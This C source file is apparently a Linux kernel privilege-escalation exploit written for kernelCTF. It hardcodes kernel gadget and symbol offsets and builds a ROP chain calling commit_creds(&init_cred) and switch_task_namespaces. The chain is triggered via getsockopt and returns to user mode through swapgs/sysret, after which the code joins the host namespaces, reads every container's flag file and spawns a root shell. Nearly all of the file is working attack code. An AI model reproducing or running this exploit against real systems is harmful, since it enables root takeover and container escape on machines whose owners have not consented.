#include <stdio.h>
#include <sched.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>

void *new_stack;

/* GADGETS */
/* data structures */

// found via inspection via gdb, as these aren't in kallsyms
#define INIT_NSPROXY_OFF 0x16574f0
#define INIT_CRED_OFF 0x16578d0

/* routines */
#define BPF_GET_CURRENT_TASK_OFF 0x1a9780
#define SWITCH_TASK_NAMESPACES_OFF 0x0b02c0
#define COMMIT_CREDS_OFF 0x0b2350
#define __AUDIT_SYSCALL_EXIT_OFF 0x163e80
#define FIND_TASK_BY_VPID_OFF 0x0a80d0
/* general purpose gadgets */

// mov rcx, rsp; mov rsp, rcx; pop rbx; pop rbp; ret;
#define STACK_PIVOT_OFF 0x8fbc8f

// mov rdi, rax; jne <x>; ret
// all of the mov rdi, rax gadgets either call or jne right after
#define MOV_RDI_RAX_OFF 0x602b3e

#define POP_RSI_OFF 0x009a66 // pop rsi; add bh, dh; ret;
#define POP_RDI_OFF 0x076990
#define POP_RCX_OFF 0x0128ef
#define POP_RBX_R14_RBP_OFF 0x0007fc

// test r9b, r9b; jne <x>; pop rbp; ret
#define TEST_R9B_R9B_OFF 0x6026bc

/* swapgs; sysret */
#define SWAPGS_SYSRET_OFF 0xc000f6

void after_rop(void);

__attribute__((naked))
void
_after_rop(void)
{
    __asm__ (
            "movq $new_stack, %rbx\n\t"
            "movq (%rbx), %rsp\n\t"
            "sub $8, %rsp\n\t"
            "jmp after_rop\n\t"
            "ud2"
            );
}

size_t dumb_strlen(char* a) {
    size_t result = 0;
    while (*a++) result++;
    return result;
}


void
after_rop(void)
{
    puts("[+] Returned to usermode! Root shell is imminent.");
#ifdef KCTF
    // set namespaces to the task that we've elevated its namespaces
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    // show flags for all containers
    system("for file in $(ls /proc/*/root/flag/flag); do cat $file; echo \"\"; done");
#endif
    execve("/bin/sh", NULL, NULL);
}

void
getsockopt_tls(int fd, uint64_t fake_stack)
{
    puts("[+] Calling getsockopt() to trigger execution.");
    getsockopt(fd, 0x41414141, 0x42424242,
                   fake_stack, 0x8181818181818181);
}

void prepare_rop(uint64_t *rop, uint64_t kernel_base)
{
    /* ROP chain overview:
     * 1. change namespaces of task with vpid 1 to root namespaces
     * 2. set credentials of current process to root creds
     * 3. cleanup and return to UM
     * 4. in UM we setns. */

    int j = 0;
    /* Start with find_task_by_vpid(1) */
    rop[j++] = kernel_base + POP_RDI_OFF;
    rop[j++] = 1;
    rop[j++] = kernel_base + FIND_TASK_BY_VPID_OFF;

    // clear zero flag so jne will not be taken in mov rdi, rax
    rop[j++] = kernel_base + TEST_R9B_R9B_OFF;
    rop[j++] = 0;

    // mov rdi, rax
    rop[j++] = kernel_base + MOV_RDI_RAX_OFF;
    rop[j++] = 0;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    rop[j++] = kernel_base + POP_RSI_OFF;
    rop[j++] = kernel_base + INIT_NSPROXY_OFF;
    rop[j++] = kernel_base + SWITCH_TASK_NAMESPACES_OFF;

    // commit_creds(&init_cred)
    rop[j++] = kernel_base + POP_RDI_OFF;
    rop[j++] = kernel_base + INIT_CRED_OFF;
    rop[j++] = kernel_base + COMMIT_CREDS_OFF;

    // __audit_syscall_exit(0, 0)
    // this is needed because otherwise,
    // audit_syscall_enter will complain
    // at the next syscall we make.
    rop[j++] = kernel_base + POP_RSI_OFF;
    rop[j++] = 0;
    rop[j++] = kernel_base + POP_RDI_OFF;
    rop[j++] = 0;
    rop[j++] = kernel_base + __AUDIT_SYSCALL_EXIT_OFF;

    // return to &_after_rop
    rop[j++] = kernel_base + POP_RCX_OFF;
    rop[j++] = &_after_rop;
    rop[j++] = kernel_base + SWAPGS_SYSRET_OFF;
}
